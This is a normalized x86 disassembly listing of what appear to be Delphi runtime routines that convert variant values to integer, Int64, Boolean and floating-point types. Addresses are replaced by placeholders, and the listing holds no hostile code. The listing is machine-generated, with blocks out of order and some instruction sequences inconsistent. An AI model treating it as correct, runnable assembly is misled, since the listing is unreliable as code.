pop ebp
retn
xor ebx ebx
jmp r-xdata
mov dx 0x2
mov ax 0x1
call sub_41ba38
sub_41d400
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
movzx eax [ eax ]
cmp eax 0x12
ja r-xdata
xor eax eax
push ebp
push sub_41d4b8
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
call sub_41ccf4
mov ebx eax
cmp ebx 0xffff
jbe r-xdata
movzx eax [ eax + lookup_table_41d425 ]
jmp [ eax * 4 + jump_table_41d438 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
call sub_4054b0
xor ebx ebx
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov ebx [ ebp - 0x8 ]
movzx ebx [ ebx + 0x8 ]
jmp r-xdata
mov ebx [ ebp - 0x8 ]
movzx ebx [ ebx + 0x8 ]
jmp r-xdata
mov ebx [ ebp - 0x8 ]
movzx ebx [ ebx + 0x8 ]
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
xor ebx ebx
jmp r-xdata
mov dx 0x12
mov ax 0x1
call sub_41ba38
sub_41d4dc
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
movzx eax [ eax ]
cmp eax 0x13
ja r-xdata
xor eax eax
push ebp
push sub_41d5a4
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
call sub_41d82c
test edx edx
je r-xdata
movzx eax [ eax + lookup_table_41d505 ]
jmp [ eax * 4 + jump_table_41d519 ]
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
call sub_4054b0
xor ebx ebx
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov ebx [ ebp - 0x8 ]
movsx ebx [ ebx + 0x8 ]
jmp r-xdata
mov ebx [ ebp - 0x8 ]
movzx ebx [ ebx + 0x8 ]
jmp r-xdata
mov ebx [ ebp - 0x8 ]
movzx ebx [ ebx + 0x8 ]
jmp r-xdata
mov ebx [ ebp - 0x8 ]
mov ebx [ ebx + 0x8 ]
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
xor ebx ebx
jmp r-xdata
mov dx 0x13
mov ax 0x1
call sub_41ba38
sub_41d5c8
push ebx
add esp 0xffffffe8
mov ebx eax
lea eax [ esp + 0x8 ]
push eax
call VariantInit
push 0x3
push 0x0
push 0x400
push ebx
lea eax [ esp + 0x18 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
test eax eax
jne r-xdata
push 0x5
push 0x0
push 0x400
push ebx
lea eax [ esp + 0x18 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
test eax eax
jne r-xdata
mov eax [ esp + 0x10 ]
cdq
mov [ esp ] eax
mov [ esp + 0x4 ] edx
jmp r-xdata
cmp eax 0x80020005
jne r-xdata
fld [ esp + 0x10 ]
call sub_404638
mov [ esp ] eax
mov [ esp + 0x4 ] edx
jmp r-xdata
mov eax [ esp ]
mov edx [ esp + 0x4 ]
add esp 0x18
pop ebx
retn
movzx edx [ ebx ]
mov cx 0x14
call sub_41becc
mov [ esp ] 0x0
mov [ esp + 0x4 ] 0x0
mov eax ebx
call sub_41dfd4
and eax 0x7f
xor edx edx
mov [ esp ] eax
mov [ esp + 0x4 ] edx
jmp r-xdata
sub_41d674
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
xor edx edx
mov [ ebp - 0x24 ] edx
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_41d762
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0x4 ]
call sub_42033c
lea eax [ ebp - 0x24 ]
mov edx [ ebp - 0x4 ]
call sub_4072f8
mov eax [ ebp - 0x24 ]
lea edx [ ebp - 0x10 ]
call sub_411be4
test al al
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41d769
lea eax [ ebp - 0x24 ]
call j_sub_4068a0
lea eax [ ebp - 0x4 ]
call sub_406d54
retn
lea eax [ ebp - 0x14 ]
push eax
push 0x0
push 0x400
mov eax [ ebp - 0x4 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
test eax eax
jne r-xdata
lea eax [ ebp - 0x20 ]
push eax
push 0x0
push 0x400
mov eax [ ebp - 0x4 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
test eax eax
jne r-xdata
mov eax [ ebp - 0x14 ]
cdq
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
cmp eax 0x80020005
jne r-xdata
fld [ ebp - 0x20 ]
call sub_404638
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
movzx edx [ ebx ]
mov cx 0x14
call sub_41becc
mov [ ebp - 0x10 ] 0x0
mov [ ebp - 0xc ] 0x0
mov eax ebx
call sub_41dfd4
and eax 0x7f
xor edx edx
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
sub_41d774
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov ebx eax
lea eax [ ebp - 0x18 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_41d7cb
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0x18 ]
call sub_41c5f0
lea eax [ ebp - 0x18 ]
call [ rw-data ]
lea eax [ ebp - 0x18 ]
call sub_41d82c
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] edx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41d7d2
lea eax [ ebp - 0x18 ]
call sub_41c288
retn
sub_41d7e0
push ebx
push esi
push edi
add esp 0xffffffec
mov edi edx
mov esi eax
mov edx esp
movzx eax [ esi ]
call sub_422ab0
mov ebx eax
test bl bl
je r-xdata
mov eax ebx
add esp 0x14
pop edi
pop esi
pop ebx
retn
lea eax [ esp + 0x4 ]
push eax
call VariantInit
push 0x14
mov ecx esi
lea edx [ esp + 0x8 ]
mov eax [ esp + 0x4 ]
mov esi [ eax ]
call [ esi + 0x1c ]
mov eax [ esp + 0xc ]
mov [ edi ] eax
mov eax [ esp + 0x10 ]
mov [ edi + 0x4 ] eax
sub_41d82c
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] eax
xor edx edx
push ebp
push sub_41dc82
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x8 ]
movzx eax [ eax ]
movzx edx ax
cmp edx 0x15
ja r-xdata
mov edx [ ebp - 0x8 ]
mov edx eax
sub dx 0x100
je r-xdata
jmp [ edx * 4 + jump_table_41d85f ]
mov eax [ ebp - 0x8 ]
call sub_41d674
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
dec dx
je r-xdata
mov [ ebp - 0x10 ] 0x0
mov [ ebp - 0xc ] 0x0
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
movsx eax [ eax + 0x8 ]
cdq
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
cdq
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x8 ]
fld [ eax + 0x8 ]
call sub_404638
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x8 ]
fld [ eax + 0x8 ]
call sub_404638
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x8 ]
fild [ eax + 0x8 ]
fdiv [ r-xdata ]
call sub_404638
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x8 ]
fld [ eax + 0x8 ]
call sub_404638
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x8 ]
call sub_41d674
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x8 ]
movsx eax [ eax + 0x8 ]
cdq
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x8 ]
movsx eax [ eax + 0x8 ]
cdq
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x8 ]
movzx eax [ eax + 0x8 ]
xor edx edx
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x8 ]
movzx eax [ eax + 0x8 ]
xor edx edx
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
xor edx edx
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ eax + 0x8 ]
mov [ ebp - 0x10 ] edx
mov edx [ eax + 0xc ]
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ eax + 0x8 ]
mov [ ebp - 0x10 ] edx
mov edx [ eax + 0xc ]
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
call sub_41d82c
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x8 ]
call sub_41d5c8
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x8 ]
call sub_41d774
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
dec dx
je r-xdata
mov [ ebp - 0x10 ] 0x0
mov [ ebp - 0xc ] 0x0
jmp r-xdata
mov dx 0x14
mov ax 0x1
call sub_41ba38
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x8 ]
call sub_41d674
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
jmp r-xdata
mov edx [ ebp - 0x8 ]
test ah 0x40
je r-xdata
lea edx [ ebp - 0x10 ]
mov eax [ ebp - 0x8 ]
call sub_41d7e0
test al al
jne r-xdata
mov edx [ ebp - 0x8 ]
movzx eax ax
and eax 0xffffbfff
cmp eax 0x15
ja r-xdata
mov eax [ ebp - 0x8 ]
call sub_41d5c8
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
mov eax [ ebp - 0x8 ]
call sub_41d5c8
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
jmp [ eax * 4 + jump_table_41dab3 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
movsx eax [ eax ]
cdq
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
mov eax [ eax ]
cdq
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
fld [ eax ]
call sub_404638
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
fld [ eax ]
call sub_404638
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
fild [ eax ]
fdiv [ r-xdata ]
call sub_404638
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
fld [ eax ]
call sub_404638
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x8 ]
call sub_41d674
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
movsx eax [ eax ]
cdq
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
movsx eax [ eax ]
cdq
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
movzx eax [ eax ]
xor edx edx
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
movzx eax [ eax ]
xor edx edx
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
mov eax [ eax ]
xor edx edx
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
mov edx [ eax ]
mov [ ebp - 0x10 ] edx
mov edx [ eax + 0x4 ]
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
mov edx [ eax ]
mov [ ebp - 0x10 ] edx
mov edx [ eax + 0x4 ]
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
call sub_41d82c
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
sub_41dcbc
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
movzx eax [ eax ]
cmp eax 0x15
ja r-xdata
xor eax eax
push ebp
push sub_41ddeb
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
call sub_41d82c
cmp edx 0x7fffffff
jne r-xdata
movzx eax [ eax + lookup_table_41dce5 ]
jmp [ eax * 4 + jump_table_41dcfb ]
jbe r-xdata
cmp eax 0xffffffff
mov [ ebp - 0x10 ] 0x0
mov [ ebp - 0xc ] 0x0
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
movsx eax [ eax + 0x8 ]
cdq
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x8 ]
movzx eax [ eax + 0x8 ]
xor edx edx
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x8 ]
movzx eax [ eax + 0x8 ]
xor edx edx
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
xor edx edx
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ eax + 0x8 ]
mov [ ebp - 0x10 ] edx
mov edx [ eax + 0xc ]
mov [ ebp - 0xc ] edx
jmp r-xdata
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
call sub_4054b0
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov [ ebp - 0x10 ] 0x0
mov [ ebp - 0xc ] 0x0
jmp r-xdata
mov dx 0x13
mov ax 0x1
call sub_41ba38
sub_41de20
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_41ded2
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0x4 ]
call sub_42033c
lea eax [ ebp - 0x8 ]
push eax
push 0x0
push 0x400
mov eax [ ebp - 0x4 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
sub edx 0x80020005
je r-xdata
lea eax [ ebp - 0xc ]
mov edx [ ebp - 0x4 ]
call sub_4072f8
mov eax [ ebp - 0xc ]
lea edx [ ebp - 0x5 ]
call sub_411cf4
test al al
jne r-xdata
sub edx 0x7ffdfffb
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41ded9
lea eax [ ebp - 0xc ]
call j_sub_4068a0
lea eax [ ebp - 0x4 ]
call sub_406d54
retn
movzx edx [ ebx ]
mov cx 0xb
mov eax 0x80020005
call sub_41becc
jmp r-xdata
movzx edx [ ebx ]
mov cx 0xb
call sub_41becc
cmp [ ebp - 0x8 ] 0x1
sbb eax eax
inc eax
mov [ ebp - 0x5 ] al
jmp r-xdata
sub_41dee4
push ebx
add esp 0xfffffff0
mov ebx eax
push esp
call VariantInit
push 0xb
push 0x0
push 0x400
push ebx
lea eax [ esp + 0x10 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
movzx edx [ ebx ]
mov cx 0xb
call sub_41becc
cmp [ esp + 0x8 ] 0x1
sbb eax eax
inc eax
add esp 0x10
pop ebx
retn
sub_41df24
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
mov ebx eax
lea eax [ ebp - 0x11 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_41df78
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0x11 ]
call sub_41c5f0
lea eax [ ebp - 0x11 ]
call [ rw-data ]
lea eax [ ebp - 0x11 ]
call sub_41dfd4
mov [ ebp - 0x1 ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41df7f
lea eax [ ebp - 0x11 ]
call sub_41c288
retn
sub_41df88
push ebx
push esi
push edi
add esp 0xffffffec
mov edi edx
mov esi eax
mov edx esp
movzx eax [ esi ]
call sub_422ab0
mov ebx eax
test bl bl
je r-xdata
mov eax ebx
add esp 0x14
pop edi
pop esi
pop ebx
retn
lea eax [ esp + 0x4 ]
push eax
call VariantInit
push 0xb
mov ecx esi
lea edx [ esp + 0x8 ]
mov eax [ esp + 0x4 ]
mov esi [ eax ]
call [ esi + 0x1c ]
cmp [ esp + 0xc ] 0x1
sbb eax eax
inc eax
mov [ edi ] al
sub_41dfd4
push ebx
push ecx
mov ebx eax
movzx eax [ ebx ]
movzx edx ax
cmp edx 0x15
ja r-xdata
mov edx eax
sub dx 0x100
je r-xdata
jmp [ edx * 4 + jump_table_41dfee ]
mov eax ebx
call sub_41de20
mov [ esp ] al
jmp r-xdata
dec dx
je r-xdata
mov [ esp ] 0x0
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ ebx + 0x8 ] 0x0
setne [ esp ]
jmp r-xdata
cmp [ ebx + 0x8 ] 0x0
setne [ esp ]
jmp r-xdata
fld [ ebx + 0x8 ]
fcomp [ r-xdata ]
fwait
fnstsw ax
sahf
setne [ esp ]
jmp r-xdata
fld [ ebx + 0x8 ]
fcomp [ r-xdata ]
fwait
fnstsw ax
sahf
setne [ esp ]
jmp r-xdata
fild [ ebx + 0x8 ]
fcomp [ r-xdata ]
fwait
fnstsw ax
sahf
setne [ esp ]
jmp r-xdata
fld [ ebx + 0x8 ]
fcomp [ r-xdata ]
fwait
fnstsw ax
sahf
setne [ esp ]
jmp r-xdata
mov eax ebx
call sub_41de20
mov [ esp ] al
jmp r-xdata
cmp [ ebx + 0x8 ] 0x1
sbb eax eax
inc eax
mov [ esp ] al
jmp r-xdata
cmp [ ebx + 0x8 ] 0x0
setne [ esp ]
jmp r-xdata
cmp [ ebx + 0x8 ] 0x0
setne [ esp ]
jmp r-xdata
cmp [ ebx + 0x8 ] 0x0
setne [ esp ]
jmp r-xdata
cmp [ ebx + 0x8 ] 0x0
setne [ esp ]
jmp r-xdata
cmp [ ebx + 0xc ] 0x0
jne r-xdata
cmp [ ebx + 0xc ] 0x0
jne r-xdata
mov eax [ ebx + 0x8 ]
call sub_41dfd4
mov [ esp ] al
jmp r-xdata
mov eax ebx
call sub_41dee4
mov [ esp ] al
jmp r-xdata
movzx eax [ esp ]
pop edx
pop ebx
retn
mov eax ebx
call sub_41df24
mov [ esp ] al
jmp r-xdata
dec dx
je r-xdata
mov [ esp ] 0x0
jmp r-xdata
mov dx 0xb
mov ax 0x1
call sub_41ba38
setne al
mov [ esp ] al
jmp r-xdata
cmp [ ebx + 0x8 ] 0x0
setne al
mov [ esp ] al
jmp r-xdata
cmp [ ebx + 0x8 ] 0x0
mov eax ebx
call sub_41de20
mov [ esp ] al
jmp r-xdata
jmp r-xdata
test ah 0x40
je r-xdata
mov edx esp
mov eax ebx
call sub_41df88
test al al
jne r-xdata
movzx eax ax
and eax 0xffffbfff
cmp eax 0x15
ja r-xdata
mov eax ebx
call sub_41dee4
mov [ esp ] al
mov eax ebx
call sub_41dee4
mov [ esp ] al
jmp r-xdata
jmp [ eax * 4 + jump_table_41e1e1 ]
mov eax [ ebx + 0x8 ]
cmp [ eax ] 0x0
setne [ esp ]
jmp r-xdata
mov eax [ ebx + 0x8 ]
cmp [ eax ] 0x0
setne [ esp ]
jmp r-xdata
mov eax [ ebx + 0x8 ]
fld [ eax ]
fcomp [ r-xdata ]
fwait
fnstsw ax
sahf
setne [ esp ]
jmp r-xdata
mov eax [ ebx + 0x8 ]
fld [ eax ]
fcomp [ r-xdata ]
fwait
fnstsw ax
sahf
setne [ esp ]
jmp r-xdata
mov eax [ ebx + 0x8 ]
fild [ eax ]
fcomp [ r-xdata ]
fwait
fnstsw ax
sahf
setne [ esp ]
jmp r-xdata
mov eax [ ebx + 0x8 ]
fld [ eax ]
fcomp [ r-xdata ]
fwait
fnstsw ax
sahf
setne [ esp ]
jmp r-xdata
mov eax ebx
call sub_41de20
mov [ esp ] al
jmp r-xdata
mov eax [ ebx + 0x8 ]
cmp [ eax ] 0x1
sbb eax eax
inc eax
mov [ esp ] al
jmp r-xdata
mov eax [ ebx + 0x8 ]
cmp [ eax ] 0x0
setne [ esp ]
jmp r-xdata
mov eax [ ebx + 0x8 ]
cmp [ eax ] 0x0
setne [ esp ]
jmp r-xdata
mov eax [ ebx + 0x8 ]
cmp [ eax ] 0x0
setne [ esp ]
jmp r-xdata
mov eax [ ebx + 0x8 ]
cmp [ eax ] 0x0
setne [ esp ]
jmp r-xdata
mov eax [ ebx + 0x8 ]
cmp [ eax + 0x4 ] 0x0
jne r-xdata
mov eax [ ebx + 0x8 ]
cmp [ eax + 0x4 ] 0x0
jne r-xdata
mov eax [ ebx + 0x8 ]
call sub_41dfd4
mov [ esp ] al
jmp r-xdata
setne al
mov [ esp ] al
jmp r-xdata
cmp [ eax ] 0x0
setne al
mov [ esp ] al
jmp r-xdata
cmp [ eax ] 0x0
sub_41e37c
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
xor edx edx
mov [ ebp - 0x24 ] edx
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_41e431
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0x4 ]
call sub_42033c
lea eax [ ebp - 0x10 ]
push eax
push 0x0
push 0x400
mov eax [ ebp - 0x4 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
sub edx 0x80020005
je r-xdata
lea eax [ ebp - 0x24 ]
mov edx [ ebp - 0x4 ]
call sub_4072f8
mov eax [ ebp - 0x24 ]
lea edx [ ebp - 0x20 ]
call sub_4137ac
test al al
je r-xdata
sub edx 0x7ffdfffb
jne r-xdata
movzx edx [ ebx ]
mov cx 0x5
mov eax 0x80020005
call sub_41becc
jmp r-xdata
fld [ ebp - 0x20 ]
fstp [ ebp - 0x10 ]
fwait
jmp r-xdata
movzx edx [ ebx ]
mov cx 0x5
call sub_41becc
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41e438
lea eax [ ebp - 0x24 ]
call j_sub_4068a0
lea eax [ ebp - 0x4 ]
call sub_406d54
retn
sub_41e440
push ebx
add esp 0xffffffe8
mov ebx eax
lea eax [ esp + 0x8 ]
push eax
call VariantInit
push 0x5
push 0x0
push 0x400
push ebx
lea eax [ esp + 0x18 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
movzx edx [ ebx ]
mov cx 0x5
call sub_41becc
mov eax [ esp + 0x10 ]
mov [ esp ] eax
mov eax [ esp + 0x14 ]
mov [ esp + 0x4 ] eax
fld [ esp ]
add esp 0x18
pop ebx
retn
sub_41e48c
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov ebx eax
lea eax [ ebp - 0x18 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_41e4e1
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0x18 ]
call sub_41c5f0
lea eax [ ebp - 0x18 ]
call [ rw-data ]
lea eax [ ebp - 0x18 ]
call sub_41e53c
fstp [ ebp - 0x8 ]
fwait
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41e4e8
lea eax [ ebp - 0x18 ]
call sub_41c288
retn
sub_41e4f0
push ebx
push esi
push edi
add esp 0xffffffec
mov edi edx
mov esi eax
mov edx esp
movzx eax [ esi ]
call sub_422ab0
mov ebx eax
test bl bl
je r-xdata
mov eax ebx
add esp 0x14
pop edi
pop esi
pop ebx
retn
lea eax [ esp + 0x4 ]
push eax
call VariantInit
push 0x5
mov ecx esi
lea edx [ esp + 0x8 ]
mov eax [ esp + 0x4 ]
mov esi [ eax ]
call [ esi + 0x1c ]
mov eax [ esp + 0xc ]
mov [ edi ] eax
mov eax [ esp + 0x10 ]
mov [ edi + 0x4 ] eax
sub_41e53c
push ebx
add esp 0xffffffec
mov ebx eax
movzx eax [ ebx ]
movzx edx ax
cmp edx 0x15
ja r-xdata
mov edx eax
sub dx 0x100
je r-xdata
jmp [ edx * 4 + jump_table_41e558 ]
mov eax ebx
call sub_41e37c
fstp [ esp ]
fwait
jmp r-xdata
dec dx
je r-xdata
xor eax eax
mov [ esp ] eax
mov [ esp + 0x4 ] eax
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
fild [ ebx + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
fild [ ebx + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
fld [ ebx + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov [ esp ] eax
mov eax [ ebx + 0xc ]
mov [ esp + 0x4 ] eax
jmp r-xdata
fild [ ebx + 0x8 ]
fdiv [ r-xdata ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov [ esp ] eax
mov eax [ ebx + 0xc ]
mov [ esp + 0x4 ] eax
jmp r-xdata
mov eax ebx
call sub_41e37c
fstp [ esp ]
fwait
jmp r-xdata
movsx eax [ ebx + 0x8 ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
movsx eax [ ebx + 0x8 ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
movzx eax [ ebx + 0x8 ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
movzx eax [ ebx + 0x8 ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov [ esp + 0xc ] eax
xor eax eax
mov [ esp + 0x10 ] eax
fild [ esp + 0xc ]
fstp [ esp ]
fwait
jmp r-xdata
fild [ ebx + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov edx [ ebx + 0xc ]
mov [ esp + 0xc ] eax
sub edx 0x80000000
mov [ esp + 0x10 ] edx
fild [ esp + 0xc ]
fadd [ r-xdata ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
call sub_41e53c
fstp [ esp ]
fwait
jmp r-xdata
mov eax ebx
call sub_41e440
fstp [ esp ]
fwait
jmp r-xdata
fld [ esp ]
add esp 0x14
pop ebx
retn
mov eax ebx
call sub_41e48c
fstp [ esp ]
fwait
jmp r-xdata
dec dx
je r-xdata
xor eax eax
mov [ esp ] eax
mov [ esp + 0x4 ] eax
jmp r-xdata
mov dx 0x5
mov ax 0x1
call sub_41ba38
mov eax ebx
call sub_41e37c
fstp [ esp ]
fwait
jmp r-xdata
jmp r-xdata
test ah 0x40
je r-xdata
mov edx esp
mov eax ebx
call sub_41e4f0
test al al
jne r-xdata
movzx eax ax
and eax 0xffffbfff
cmp eax 0x15
ja r-xdata
mov eax ebx
call sub_41e440
fstp [ esp ]
fwait
mov eax ebx
call sub_41e440
fstp [ esp ]
fwait
jmp r-xdata
jmp [ eax * 4 + jump_table_41e774 ]
mov eax [ ebx + 0x8 ]
fild [ eax ]
fstp [ esp ]
fwait
jmp r-xdata
